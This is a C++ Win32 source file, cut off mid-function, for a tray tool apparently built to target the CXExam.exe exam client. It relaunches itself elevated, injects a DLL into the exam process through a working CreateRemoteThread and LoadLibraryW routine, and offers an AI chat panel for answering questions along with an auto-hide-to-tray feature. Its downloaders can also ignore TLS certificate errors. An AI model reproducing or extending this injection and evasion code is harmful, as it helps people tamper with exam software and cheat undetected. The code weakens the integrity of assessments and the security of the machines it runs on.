// Project1.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "Project1.h"
#include <shellapi.h>
#include <commdlg.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <objbase.h>
#include <urlmon.h>
#include <wininet.h>
#include <winhttp.h>
#include <strsafe.h>
#include <gdiplus.h>
#include <stdarg.h>
#include <psapi.h>
#include <vector>
#include <string>
#include <sstream>
#include <memory>
#include <cstdio>
using namespace Gdiplus;

static const UINT WM_TRAYICON = WM_APP + 20;
static const UINT WM_AI_RESPONSE = WM_APP + 21;

enum TrayMenuCommandId
{
    IDM_TRAY_SHOW = 40001,
    IDM_TRAY_EXIT = 40002,
};

struct AiConfig
{
    WCHAR endpoint[512];
    WCHAR apiKey[512];
    WCHAR model[128];
};

struct AiResponsePayload
{
    bool success;
    std::wstring message;
};

static AiConfig g_aiConfig = {
    L"https://api.openai.com/v1/chat/completions",
    L"",
    L"gpt-3.5-turbo"
};

static bool g_autoHide = true;
static std::wstring g_configFilePath;
static NOTIFYICONDATAW g_trayIconData = {};
static bool g_trayIconVisible = false;
static HWND g_aiWindow = nullptr;

// 调试控制台：创建并输出
static void SetupDebugConsole() {
    if (GetConsoleWindow()) return;
    if (AllocConsole()) {
        SetConsoleTitleW(L"Injector Debug Console");
        HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hOut && hOut != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            WriteConsoleW(hOut, L"[Console] Allocated debug console.\r\n", 34, &written, nullptr);
        }
    }
}

// 统一打印（宽字符）
static void DebugPrintFormat(const WCHAR* fmt, ...) {
    WCHAR line[1024] = {0};
    va_list args; va_start(args, fmt);
    _vsnwprintf_s(line, _countof(line), _TRUNCATE, fmt, args);
    va_end(args);
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut && hOut != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        WriteConsoleW(hOut, line, lstrlenW(line), &written, nullptr);
        WriteConsoleW(hOut, L"\r\n", 2, &written, nullptr);
    }
}

#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Comdlg32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "Psapi.lib")

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 控件ID
enum
{
    IDC_EDIT_URL = 2001,
    IDC_BTN_VISIT = 2002,
    IDC_BTN_ENTER = 2003,
    IDC_STATIC_DECL = 2004,
    IDC_STATIC_FOOTER = 2005,

    // 第二阶段控件
    IDC_STATIC_STEP2 = 2101,
    IDC_EDIT_EXE_PATH = 2102,
    IDC_BTN_BROWSE_EXE = 2103,
    IDC_BTN_DOWNLOAD = 2104,
    IDC_BTN_LAUNCH = 2105,
    IDC_STATIC_STATUS = 2106,
    IDC_BTN_AUTO_FIND = 2107,
    IDC_BTN_PICK_FOLDER = 2108,
    IDC_STATIC_IMAGE = 2110,
    IDC_BTN_DONATE = 2111,
    IDC_BTN_DONATE2 = 2112,

    // AI功能控件
    IDC_BTN_AI_CONFIG = 2120,
    IDC_BTN_AI_HELPER = 2121,
    IDC_EDIT_AI_ENDPOINT = 2122,
    IDC_EDIT_AI_KEY = 2123,
    IDC_EDIT_AI_MODEL = 2124,
    IDC_STATIC_AI_ENDPOINT = 2125,
    IDC_STATIC_AI_KEY = 2126,
    IDC_STATIC_AI_MODEL = 2127,
    IDC_BTN_AI_SAVE = 2128,
    IDC_BTN_AI_TEST = 2129,
    IDC_EDIT_AI_QUESTION = 2130,
    IDC_EDIT_AI_ANSWER = 2131,
    IDC_BTN_AI_ASK = 2132,
    IDC_CHK_AUTO_HIDE = 2133,
    IDC_BTN_HIDE_TRAY = 2134,
};

// 状态
static WCHAR g_cxExamPath[MAX_PATH] = L"";
static WCHAR g_downloadedFile[MAX_PATH] = L"";
static HANDLE g_processHandle = nullptr;
static DWORD g_processId = 0;
static bool g_entered = false;
static HBITMAP g_hImageBmp = nullptr;
static ULONG_PTR g_gdiplusToken = 0;
static Bitmap* g_gdipSrc = nullptr;
static bool g_donateShownImage = false; // 不再内嵌展示，仅用于兼容
static ATOM g_donateWndClass = 0;
static HFONT g_hUIFont = nullptr;
static LRESULT CALLBACK DonateWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_CREATE:
        {
            CREATESTRUCTW* cs = (CREATESTRUCTW*)lParam;
            HBITMAP hbmp = (HBITMAP)cs->lpCreateParams;
            HWND hPic = CreateWindowW(L"STATIC", L"", WS_CHILD | WS_VISIBLE | SS_BITMAP,
                0, 0, 10, 10, hwnd, (HMENU)1, hInst, nullptr);
            if (hbmp)
            {
                SendMessageW(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hbmp);
            }
        }
        break;
    case WM_SIZE:
        {
            RECT rc; GetClientRect(hwnd, &rc);
            MoveWindow(GetDlgItem(hwnd, 1), 0, 0, rc.right - rc.left, rc.bottom - rc.top, TRUE);
        }
        break;
    case WM_KEYDOWN:
        if (wParam == VK_ESCAPE) { DestroyWindow(hwnd); return 0; }
        break;
    case WM_LBUTTONDOWN:
        // 单击窗口任意处也可关闭
        DestroyWindow(hwnd);
        return 0;
    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

static void EnsureDonateWndClass()
{
    if (g_donateWndClass) return;
    WNDCLASSEXW wc = {};
    wc.cbSize = sizeof(wc);
    wc.hInstance = hInst;
    wc.lpszClassName = L"DonateWnd";
    wc.lpfnWndProc = DonateWndProc;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    g_donateWndClass = RegisterClassExW(&wc);
}

// 工具函数
static void SetStatus(HWND hWnd, const WCHAR* text)
{
    HWND h = GetDlgItem(hWnd, IDC_STATIC_STATUS);
    if (h) SetWindowTextW(h, text);
}

// 格式化系统错误码为可读文本
static void FormatLastErrorMessage(DWORD err, WCHAR* buf, DWORD cch)
{
    if (!buf || cch == 0) return;
    buf[0] = 0;
    LPWSTR tmp = nullptr;
    DWORD len = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr, err, 0, (LPWSTR)&tmp, 0, nullptr);
    if (len && tmp)
    {
        wcsncpy_s(buf, cch, tmp, _TRUNCATE);
        LocalFree(tmp);
    }
    else
    {
        wsprintfW(buf, L"未知错误");
    }
}

static void RepositionFooter(HWND hWnd)
{
    HWND hFooter = GetDlgItem(hWnd, IDC_STATIC_FOOTER);
    if (!hFooter) return;
    RECT rc; GetClientRect(hWnd, &rc);
    int clientW = rc.right - rc.left;
    int clientH = rc.bottom - rc.top;
    int footerW = 200;
    int footerH = 16;
    int x = (clientW - footerW) / 2;
    int y = clientH - (footerH + 8);
    if (x < 0) x = 0;
    if (y < 0) y = 0;
    SetWindowPos(hFooter, nullptr, x, y, footerW, footerH, SWP_NOZORDER | SWP_NOACTIVATE);
}

static void CenterWindowOnScreen(HWND hwnd)
{
    if (!hwnd) return;
    RECT rc; GetWindowRect(hwnd, &rc);
    int winW = rc.right - rc.left;
    int winH = rc.bottom - rc.top;
    RECT wa; SystemParametersInfoW(SPI_GETWORKAREA, 0, &wa, 0);
    int scrW = wa.right - wa.left;
    int scrH = wa.bottom - wa.top;
    int x = wa.left + (scrW - winW) / 2;
    int y = wa.top + (scrH - winH) / 2;
    SetWindowPos(hwnd, nullptr, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
}

static HFONT CreateUIFont()
{
    if (g_hUIFont) return g_hUIFont;
    // 使用更现代的 Segoe UI 字体，清晰度更好
    g_hUIFont = CreateFontW(
        -16, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");
    if (!g_hUIFont)
        g_hUIFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
    return g_hUIFont;
}

static void ApplyUIFont(HWND hWnd)
{
    HFONT hf = CreateUIFont();
    if (!hf) return;
    for (HWND child = GetWindow(hWnd, GW_CHILD); child; child = GetWindow(child, GW_HWNDNEXT))
    {
        SendMessageW(child, WM_SETFONT, (WPARAM)hf, TRUE);
    }
}

static HBITMAP CreateScaledBitmapFromGdip(Bitmap* srcBmp, UINT targetHeight)
{
    if (!srcBmp) return nullptr;
    UINT w = srcBmp->GetWidth();
    UINT h = srcBmp->GetHeight();
    if (h == 0) return nullptr;
    UINT outH = targetHeight;
    UINT outW = (UINT)((double)w * (double)outH / (double)h);
    Bitmap outBmp(outW, outH, PixelFormat32bppARGB);
    Graphics g(&outBmp);
    g.SetInterpolationMode(InterpolationModeHighQualityBicubic);
    g.DrawImage(srcBmp, Rect(0, 0, outW, outH));
    HBITMAP hbmp = nullptr;
    outBmp.GetHBITMAP(Color(255,255,255,255), &hbmp);
    return hbmp;
}

static HBITMAP CreateStretchedBitmapFromGdip(Bitmap* srcBmp, UINT targetWidth, UINT targetHeight)
{
    if (!srcBmp || targetWidth == 0 || targetHeight == 0) return nullptr;
    Bitmap outBmp(targetWidth, targetHeight, PixelFormat32bppARGB);
    Graphics g(&outBmp);
    g.SetInterpolationMode(InterpolationModeHighQualityBicubic);
    g.DrawImage(srcBmp, Rect(0, 0, (INT)targetWidth, (INT)targetHeight));
    HBITMAP hbmp = nullptr;
    outBmp.GetHBITMAP(Color(255,255,255,255), &hbmp);
    return hbmp;
}

static void EnsureImageLoaded()
{
    if (g_gdipSrc) return;
    WCHAR cachePath[MAX_PATH] = L"";
    HRESULT hr = URLDownloadToCacheFileW(nullptr,
        L"https://gitee.com/SJYssr/img/raw/main/cef_cx_copy_tool/zanshang2.png",
        cachePath, MAX_PATH, 0, nullptr);
    if (FAILED(hr)) return;
    g_gdipSrc = Bitmap::FromFile(cachePath, FALSE);
    if (!g_gdipSrc || g_gdipSrc->GetLastStatus() != Ok)
    {
        if (g_gdipSrc) { delete g_gdipSrc; g_gdipSrc = nullptr; }
    }
}

static void RepositionImageAndText(HWND hWnd)
{
    if (g_entered) return; // 第二界面隐藏图片/按钮
    HWND hImg = GetDlgItem(hWnd, IDC_STATIC_IMAGE);
    HWND hBtn = GetDlgItem(hWnd, IDC_BTN_DONATE);
    HWND hDecl = GetDlgItem(hWnd, IDC_STATIC_DECL);
    if ((!hImg && !hBtn) || !hDecl) return;
    EnsureImageLoaded();
    RECT rc; GetClientRect(hWnd, &rc);
    int clientW = rc.right - rc.left;
    int clientH = rc.bottom - rc.top;
    const int margin = 8;
    const int footerH = 16;
    int topY = 64; // 声明起始y
    int bottomY = clientH - (footerH + margin);
    int availH = bottomY - topY;
    if (availH < 32) availH = 32;
    // 声明占满整行
    int declW = clientW - 16;
    SetWindowPos(hDecl, nullptr, 8, topY, declW, 64, SWP_NOZORDER | SWP_NOACTIVATE);
    // 小型赞赏按钮：放在右上角（声明区域右上）尺寸 60x24
    int btnW = 60, btnH = 24;
    int btnX = clientW - margin - btnW;
    int btnY = topY; // 紧贴声明顶部
    if (hBtn)
    {
        SetWindowPos(hBtn, nullptr, btnX, btnY, btnW, btnH, SWP_NOZORDER | SWP_NOACTIVATE | SWP_SHOWWINDOW);
        SetWindowTextW(hBtn, L"赞赏");
    }
    if (hImg) ShowWindow(hImg, SW_HIDE);
}

static HRESULT DownloadFileWinInet(const WCHAR* url, const WCHAR* targetPath, bool ignoreCertErrors)
{
    HINTERNET hInternet = InternetOpenW(L"Project1Downloader", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hInternet) return HRESULT_FROM_WIN32(GetLastError());

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (wcsncmp(url, L"https://", 8) == 0)
    {
        flags |= INTERNET_FLAG_SECURE;
        if (ignoreCertErrors)
        {
            flags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP;
        }
    }

    HINTERNET hFile = InternetOpenUrlW(hInternet, url, nullptr, 0, flags, 0);
    if (!hFile)
    {
        DWORD err = GetLastError();
        InternetCloseHandle(hInternet);
        return HRESULT_FROM_WIN32(err);
    }

    HANDLE hOut = CreateFileW(targetPath, GENERIC_WRITE, FILE_SHARE_READ, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return HRESULT_FROM_WIN32(err);
    }

    const DWORD kBufSize = 64 * 1024;
    BYTE* buf = (BYTE*)malloc(kBufSize);
    if (!buf)
    {
        CloseHandle(hOut);
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return E_OUTOFMEMORY;
    }
    BOOL ok = TRUE;
    DWORD read = 0;
    DWORD written = 0;
    HRESULT hr = S_OK;
    while (InternetReadFile(hFile, buf, kBufSize, &read) && read > 0)
    {
        if (!WriteFile(hOut, buf, read, &written, nullptr) || written != read)
        {
            hr = HRESULT_FROM_WIN32(GetLastError());
            ok = FALSE;
            break;
        }
    }
    free(buf);
    CloseHandle(hOut);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return ok ? S_OK : hr;
}

static HRESULT DownloadFileWinHttp(const WCHAR* url, const WCHAR* targetPath, bool ignoreCertErrors)
{
    // 解析 URL
    URL_COMPONENTS uc = {};
    uc.dwStructSize = sizeof(uc);
    WCHAR host[256] = L"";
    WCHAR path[2048] = L"";
    uc.lpszHostName = host; uc.dwHostNameLength = _countof(host);
    uc.lpszUrlPath = path; uc.dwUrlPathLength = _countof(path);
    if (!InternetCrackUrlW(url, 0, 0, &uc))
    {
        return HRESULT_FROM_WIN32(GetLastError());
    }

    HINTERNET hSession = WinHttpOpen(L"Project1Downloader/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return HRESULT_FROM_WIN32(GetLastError());

    // 超时设置
    DWORD timeout = 30000;
    WinHttpSetTimeouts(hSession, timeout, timeout, timeout, timeout);

    INTERNET_PORT port = uc.nPort ? (INTERNET_PORT)uc.nPort : (uc.nScheme == INTERNET_SCHEME_HTTPS ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT);
    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect)
    {
        DWORD err = GetLastError();
        WinHttpCloseHandle(hSession);
        return HRESULT_FROM_WIN32(err);
    }

    DWORD flags = 0;
    if (uc.nScheme == INTERNET_SCHEME_HTTPS) flags |= WINHTTP_FLAG_SECURE;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest)
    {
        DWORD err = GetLastError();
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return HRESULT_FROM_WIN32(err);
    }

    if (ignoreCertErrors && (flags & WINHTTP_FLAG_SECURE))
    {
        DWORD secFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }

    BOOL b = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!b)
    {
        DWORD err = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return HRESULT_FROM_WIN32(err);
    }
    b = WinHttpReceiveResponse(hRequest, nullptr);
    if (!b)
    {
        DWORD err = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return HRESULT_FROM_WIN32(err);
    }

    HANDLE hOut = CreateFileW(targetPath, GENERIC_WRITE, FILE_SHARE_READ, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return HRESULT_FROM_WIN32(err);
    }

    DWORD dwSize = 0;
    BYTE buffer[64 * 1024];
    DWORD written = 0;
    HRESULT hr = S_OK;
    for (;;)
    {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) { hr = HRESULT_FROM_WIN32(GetLastError()); break; }
        if (dwSize == 0) break;
        if (dwSize > sizeof(buffer)) dwSize = sizeof(buffer);
        DWORD dwRead = 0;
        if (!WinHttpReadData(hRequest, buffer, dwSize, &dwRead)) { hr = HRESULT_FROM_WIN32(GetLastError()); break; }
        if (dwRead == 0) break;
        if (!WriteFile(hOut, buffer, dwRead, &written, nullptr) || written != dwRead) { hr = HRESULT_FROM_WIN32(GetLastError()); break; }
    }

    CloseHandle(hOut);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return hr;
}

static bool FileExistsW(const WCHAR* path)
{
    DWORD attr = GetFileAttributesW(path);
    return (attr != INVALID_FILE_ATTRIBUTES) && !(attr & FILE_ATTRIBUTE_DIRECTORY);
}

static ULONGLONG GetFileSizeU64(const WCHAR* path)
{
    ULONGLONG size = 0;
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE)
    {
        LARGE_INTEGER li;
        if (GetFileSizeEx(h, &li)) size = (ULONGLONG)li.QuadPart;
        CloseHandle(h);
    }
    return size;
}

static bool IsProcessElevated() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;
    TOKEN_ELEVATION elev = {};
    DWORD retLen = 0;
    BOOL ok = GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &retLen);
    CloseHandle(hToken);
    return ok && elev.TokenIsElevated;
}

// 非管理员则以 runas 重启自身
static void RelaunchSelfElevatedIfNeeded() {
    if (IsProcessElevated()) return;
    WCHAR exe[MAX_PATH] = L"";
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    SHELLEXECUTEINFOW sei = {};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";
    sei.lpFile = exe;
    sei.nShow = SW_SHOWNORMAL;
    if (ShellExecuteExW(&sei)) {
        ExitProcess(0);
    }
}

// 检测进程中是否加载了指定模块（按基名匹配，可选完整路径精确匹配）
static bool IsModuleLoadedInProcess(HANDLE hProcess, const wchar_t* baseName, const wchar_t* fullPathOrNull) {
    DWORD needed = 0;
    // 先探测需要的缓冲大小
    EnumProcessModulesEx(hProcess, nullptr, 0, &needed, LIST_MODULES_ALL);
    if (needed == 0) return false;

    size_t count = needed / sizeof(HMODULE);
    std::vector<HMODULE> mods(count);
    if (!EnumProcessModulesEx(hProcess, mods.data(), needed, &needed, LIST_MODULES_ALL)) return false;

    for (HMODULE m : mods) {
        WCHAR path[MAX_PATH] = L"";
        if (!GetModuleFileNameExW(hProcess, m, path, MAX_PATH)) continue;
        const WCHAR* base = wcsrchr(path, L'\\');
        base = base ? base + 1 : path;
        if (_wcsicmp(base, baseName) == 0) {
            if (!fullPathOrNull) return true;
            if (_wcsicmp(path, fullPathOrNull) == 0) return true;
        }
    }
    return false;
}

// 远程注入（CreateRemoteThread + LoadLibraryW）
static HRESULT InjectDllViaCreateRemoteThread(DWORD pid, const wchar_t* dllPath) {
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                               PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) return HRESULT_FROM_WIN32(GetLastError());

    SIZE_T bytes = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID remote = VirtualAllocEx(hProc, nullptr, bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { CloseHandle(hProc); return HRESULT_FROM_WIN32(GetLastError()); }

    if (!WriteProcessMemory(hProc, remote, dllPath, bytes, nullptr)) {
        DWORD e = GetLastError(); VirtualFreeEx(hProc, remote, 0, MEM_RELEASE); CloseHandle(hProc);
        return HRESULT_FROM_WIN32(e);
    }

    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
    if (k32 == nullptr) {
        k32 = LoadLibraryW(L"kernel32.dll");
        if (k32 == nullptr) {
            VirtualFreeEx(hProc, remote, 0, MEM_RELEASE); CloseHandle(hProc);
            return HRESULT_FROM_WIN32(GetLastError());
        }
    }

    FARPROC loadLib = GetProcAddress(k32, "LoadLibraryW");
    if (!loadLib) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE); CloseHandle(hProc);
        return HRESULT_FROM_WIN32(ERROR_PROC_NOT_FOUND);
    }

    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0,
                                        (LPTHREAD_START_ROUTINE)loadLib, remote, 0, nullptr);
    if (!hThread) {
        DWORD e = GetLastError(); VirtualFreeEx(hProc, remote, 0, MEM_RELEASE); CloseHandle(hProc);
        return HRESULT_FROM_WIN32(e);
    }

    WaitForSingleObject(hThread, 10000);
    DWORD exitCode = 0; GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);
    VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return exitCode ? S_OK : E_FAIL;
}

static void ShowHrError(HWND hWnd, const WCHAR* title, HRESULT hr, const WCHAR* extra = nullptr)
{
    WCHAR msg[512] = L"";
    if (extra)
        wsprintfW(msg, L"%s\nHRESULT=0x%08X (%d)", extra, (UINT)hr, (INT)(hr & 0xFFFF));
    else
        wsprintfW(msg, L"HRESULT=0x%08X (%d)", (UINT)hr, (INT)(hr & 0xFFFF));
    MessageBoxW(hWnd, msg, title, MB_OK | MB_ICONERROR);
}

static void ApplyFoundPath(HWND hWnd, const WCHAR* path)
{
    lstrcpynW(g_cxExamPath, path, MAX_PATH);
    SetWindowTextW(GetDlgItem(hWnd, IDC_EDIT_EXE_PATH), g_cxExamPath);
    SetStatus(hWnd, L"状态：已找到 CXExam.exe");
}

static void LoadAiConfig()
{
    WCHAR configPath[MAX_PATH] = L"";
    GetModuleFileNameW(nullptr, configPath, MAX_PATH);
    PathRemoveFileSpecW(configPath);
    PathAppendW(configPath, L"ai_config.ini");
    
    GetPrivateProfileStringW(L"AI", L"Endpoint", g_aiConfig.endpoint, g_aiConfig.endpoint, 512, configPath);
    GetPrivateProfileStringW(L"AI", L"ApiKey", L"", g_aiConfig.apiKey, 512, configPath);
    GetPrivateProfileStringW(L"AI", L"Model", g_aiConfig.model, g_aiConfig.model, 128, configPath);
    g_autoHide = GetPrivateProfileIntW(L"Settings", L"AutoHide", 1, configPath) != 0;
    
    DebugPrintFormat(L"[Config] Loaded: Endpoint=%ls, Model=%ls, AutoHide=%d", 
        g_aiConfig.endpoint, g_aiConfig.model, g_autoHide);
}

static void SaveAiConfig()
{
    WCHAR configPath[MAX_PATH] = L"";
    GetModuleFileNameW(nullptr, configPath, MAX_PATH);
    PathRemoveFileSpecW(configPath);
    PathAppendW(configPath, L"ai_config.ini");
    
    WritePrivateProfileStringW(L"AI", L"Endpoint", g_aiConfig.endpoint, configPath);
    WritePrivateProfileStringW(L"AI", L"ApiKey", g_aiConfig.apiKey, configPath);
    WritePrivateProfileStringW(L"AI", L"Model", g_aiConfig.model, configPath);
    
    WCHAR autoHideStr[8];
    wsprintfW(autoHideStr, L"%d", g_autoHide ? 1 : 0);
    WritePrivateProfileStringW(L"Settings", L"AutoHide", autoHideStr, configPath);
    
    DebugPrintFormat(L"[Config] Saved: Endpoint=%ls, Model=%ls, AutoHide=%d", 
        g_aiConfig.endpoint, g_aiConfig.model, g_autoHide);
}

static bool CreateTrayIcon(HWND hwnd)
{
    if (g_trayIconVisible) return true;
    
    ZeroMemory(&g_trayIconData, sizeof(g_trayIconData));
    g_trayIconData.cbSize = sizeof(NOTIFYICONDATAW);
    g_trayIconData.hWnd = hwnd;
    g_trayIconData.uID = 1;
    g_trayIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    g_trayIconData.uCallbackMessage = WM_TRAYICON;
    g_trayIconData.hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_SMALL));
    lstrcpyW(g_trayIconData.szTip, L"智能注入助手");
    
    if (Shell_NotifyIconW(NIM_ADD, &g_trayIconData))
    {
        g_trayIconVisible = true;
        DebugPrintFormat(L"[Tray] Icon created");
        return true;
    }
    return false;
}

static void RemoveTrayIcon()
{
    if (g_trayIconVisible)
    {
        Shell_NotifyIconW(NIM_DELETE, &g_trayIconData);
        g_trayIconVisible = false;
        DebugPrintFormat(L"[Tray] Icon removed");
    }
}

static void ShowTrayMenu(HWND hwnd)
{
    HMENU hMenu = CreatePopupMenu();
    if (!hMenu) return;
    
    AppendMenuW(hMenu, MF_STRING, IDM_TRAY_SHOW, L"显示窗口");
    AppendMenuW(hMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenuW(hMenu, MF_STRING, IDM_TRAY_EXIT, L"退出");
    
    POINT pt;
    GetCursorPos(&pt);
    SetForegroundWindow(hwnd);
    TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, nullptr);
    PostMessage(hwnd, WM_NULL, 0, 0);
    DestroyMenu(hMenu);
}

static void HideWindowToTray(HWND hwnd)
{
    if (!hwnd) return;
    if (CreateTrayIcon(hwnd))
    {
        ShowWindow(hwnd, SW_HIDE);
        DebugPrintFormat(L"[Tray] Window hidden to tray");
    }
}

static void RestoreWindowFromTray(HWND hwnd)
{
    if (!hwnd) return;
    if (g_trayIconVisible)
    {
        RemoveTrayIcon();
    }
    ShowWindow(hwnd, SW_SHOWNORMAL);
    SetForegroundWindow(hwnd);
    DebugPrintFormat(L"[Tray] Window restored from tray");
}

static std::wstring CallAiApi(const std::wstring& question)
{
    DebugPrintFormat(L"[AI] Calling API with question: %ls", question.c_str());
    
    if (wcslen(g_aiConfig.apiKey) == 0)
    {
        return L"错误：未配置API Key，请先在AI配置中设置。";
    }
    
    std::wstring jsonBody = L"{\"model\":\"";
    jsonBody += g_aiConfig.model;
    jsonBody += L"\",\"messages\":[{\"role\":\"user\",\"content\":\"";
    
    std::wstring escapedQuestion = question;
    size_t pos = 0;
    while ((pos = escapedQuestion.find(L"\"", pos)) != std::wstring::npos)
    {
        escapedQuestion.replace(pos, 1, L"\\\"");
        pos += 2;
    }
    pos = 0;
    while ((pos = escapedQuestion.find(L"\n", pos)) != std::wstring::npos)
    {
        escapedQuestion.replace(pos, 1, L"\\n");
        pos += 2;
    }
    
    jsonBody += escapedQuestion;
    jsonBody += L"\"}]}";
    
    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, jsonBody.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (utf8Len == 0) return L"错误：转换失败";
    
    std::unique_ptr<char[]> utf8Body(new char[utf8Len]);
    WideCharToMultiByte(CP_UTF8, 0, jsonBody.c_str(), -1, utf8Body.get(), utf8Len, nullptr, nullptr);
    
    URL_COMPONENTS uc = {};
    uc.dwStructSize = sizeof(uc);
    WCHAR host[256] = L"";
    WCHAR path[2048] = L"";
    uc.lpszHostName = host;
    uc.dwHostNameLength = _countof(host);
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = _countof(path);
    
    if (!InternetCrackUrlW(g_aiConfig.endpoint, 0, 0, &uc))
    {
        return L"错误：无效的API地址";
    }
    
    HINTERNET hSession = WinHttpOpen(L"AiHelper/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return L"错误：无法创建HTTP会话";
    
    INTERNET_PORT port = uc.nPort ? (INTERNET_PORT)uc.nPort : 
        (uc.nScheme == INTERNET_SCHEME_HTTPS ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT);
    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return L"错误：无法连接到服务器";
    }
    
    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
